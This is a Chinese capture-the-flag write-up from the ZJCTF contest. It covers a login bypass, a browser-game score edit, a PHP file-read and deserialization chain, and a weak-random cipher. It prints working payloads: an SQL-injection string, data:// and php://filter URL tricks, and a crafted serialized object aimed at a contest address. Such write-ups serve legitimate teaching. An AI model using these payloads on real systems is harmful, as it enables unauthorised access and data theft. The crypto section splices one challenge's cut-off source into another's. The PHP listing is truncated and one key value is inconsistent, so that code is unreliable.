##
## 0x01 前言
这次比赛PWN爷爷没有去，去了OPPO的线下赛，所以最后只拿到了前十靠后的名次。不过还是拿到了省一等奖，也算没有留下什么遗憾。
## 0x02 万能密码
通过名字就可以知道这题考察的是最基本的SQL注入知识点。  
通过对题目环境的测试可以发现，这是基于盲注的POST注入，闭合双引号即可，登陆即可拿到flag
payload
    admin"#
## 0x03 贰零肆捌
题目是一个2048的游戏，大概就是分数多于一定的值即可，这边可以选择玩到输的时候抓包，修改分数。我这边是直接修改js代码，另score的初始值等于15001，然后玩到死亡，就获得了flag
## 0x04 逆转思维
emmmm题目环境我这边没有保留，大概题目逻辑是
### 第一步
file_get_contents（$_GET(txt)）==="welcome to the
zjctf"，大概是这个，我们要让这个条件成立，我一开始想到的是远程文件包含，就是在我这边部署一个包含这个内容的文件，让题目环境访问我们开放的端口，后来发现因为是线下局域网，没办法远程文件包含
然后比赛后半段才在我以前拉取下来的wiki的docker里面找到一个data协议。  
利用payload绕过
    http://172.16.0.102:54321/JgJUfyW1wT/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=
### 第二步
题目有第二个参数file，大概是include()这个file，题目提示我们要包含useless.php  
同时有一个判断是file参数不能传入flag，也就是我们不能直接包含flag.php  
利用php://filter协议读取这个useless.php  
构造payload读取useless.php
    http://172.16.0.102:54321/JgJUfyW1wT/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=php://filter/read=convert.base64-encode/resource=useless.php
得到useless.php
    file)){  
                echo file_get_contents($this->file); 
                echo "";
            return ("HAHAHAHAHA");
            }  
        }  
    }
?>
### 第三步
最后一个参数是password，php代码里面有反序列化这个传入的值，所以只要让最后反序列化出来的file等于flag.php就好了。  
构造payload
    view-source:http://172.16.0.102:54321/JgJUfyW1wT/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
得到flag
## 0x05 佛洛依德
这边有幸保留了题目
### 题目源码
    #!/usr/bin/env python
    # -*- coding: utf-8 -*-    
    __author__ = 'seclab'
    __copyright__ = 'Copyright © 2019/08/20, seclab'
    import hashlib, random, signal
    def truncated_hash(message, k):
        return hashlib.sha512(message).digest()[-k:]
    def floyd(code, k=3):
        m0 = None
        m1 = None
        turtle = truncated_hash(code, k)
        hare   = truncated_hash(turtle, k)
        while turtle != hare:
            turtle = truncated_hash(turtle, k)
            hare   = truncated_hash(truncated_hash(hare, k), k)
        turtle = code
        pre_period_length = 0
        while turtle != hare:
            m0     = turtle
            turtle = truncated_hash(turtle, k)
            hare   = truncated_hash(hare, k)
            pre_period_length += 1
        if pre_period_length is 0:
            print(code, "Failed to find a collision: code was in a cycle!")
            return floyd(get_random_code())
        period_length = 1
        hare = truncated_hash(turtle, k)
        while turtle != hare:
            m1  =   hare
            hare = truncated_hash(hare, k)
            period_length += 1
        return (m0, m1, truncated_hash(m0, k), k)
    def get_random_code(length=3):
        char_set = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        pw = ""
        for i in range(length):
            next_index = random.randrange(len(char_set))
            pw = pw + char_set[next_index]
        return pw
    def welcom():
        signal.alarm(5)
        print(
    r'''
     _____ _                 _     ____                _    
    |  ___| | ___  _   _  __| |   / ___|_ __ __ _  ___| | __
    | |_  | |/ _ \| | | |/ _` |  | |   | '__/ _` |/ __| |/ /
    |  _| | | (_) | |_| | (_| |  | |___| | | (_| | (__|    encrypt.py
得到的encrypt.py源码为
    # uncompyle6 version 3.3.5
    # Python bytecode 2.7 (62211)
    # Decompiled from: Python 2.7.15+ (default, Nov 28 2018, 16:27:22) 
    # [GCC 8.2.0]
    # Embedded file name: encrypt.py
    # Compiled at: 2017-07-11 05:19:27
    from random import randint
    from math import floor, sqrt
    _ = ''
    __ = '_'
    ____ = [ ord(___) for ___ in __ ]
    _____ = randint(65, max(____)) * 255
    for ___ in range(len(__)):
        _ += str(int(floor(float(_____ + ____[___]) / 2 + sqrt(_____ * ____[___])) % 255)) + ' '
    print _
    # okay decompiling encrypt.pyo
我这边是现对这些下划线进行了处理  
大概逻辑是这样的
    from random import randint
    from math import floor, sqrt
    getflag = ''
    flag = 'flag{****************}'
    b = [ ord(i) for i in flag ]
    a = randint(65, max(b)) * 255
    for i in range(len(flag)):
        getflag += str(int(floor(float(a + b[i]) / 2 + sqrt(a * b[i])) % 255)) + ' '
    print getflag
这边题目还给了我们一个flag.enc的文件
    57, 183, 124, 9, 149, 65, 245, 166, 175, 1, 226, 106, 216, 132, 224, 208, 139, 1, 188, 224, 9, 235, 106, 149, 141, 80
这个就是flag经过加密后的内容了。
通过分析代码逻辑，我们可以发现，max(b)一定是}的ascii值，然加密后的值一定是最后一个80.通过这个其实我们可以确定一个值，randint(65,
max(b))的值可以确定，通过排除一个大于}的ascii的值，确定为102
也就是说我们确定了a的值为102*125  
这样其实我们就可以确定每一个字母对应的加密后的值了  
构造对应关系脚本
    from random import randint
    from math import floor, sqrt
    table = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/{}'
    b = [ ord(i) for i in table ]
    a = 102*255
    dic=[]
    for i in range(len(table)):
        dic.append(int(floor(float(a + b[i]) / 2 + sqrt(a * b[i])) % 255))
    for i in range(len(dic)):
        print(table[i],":",dic[i])
    print(dic)
最后得到flag加密前的值  
zjctf{ThisRandomIsNotSafe}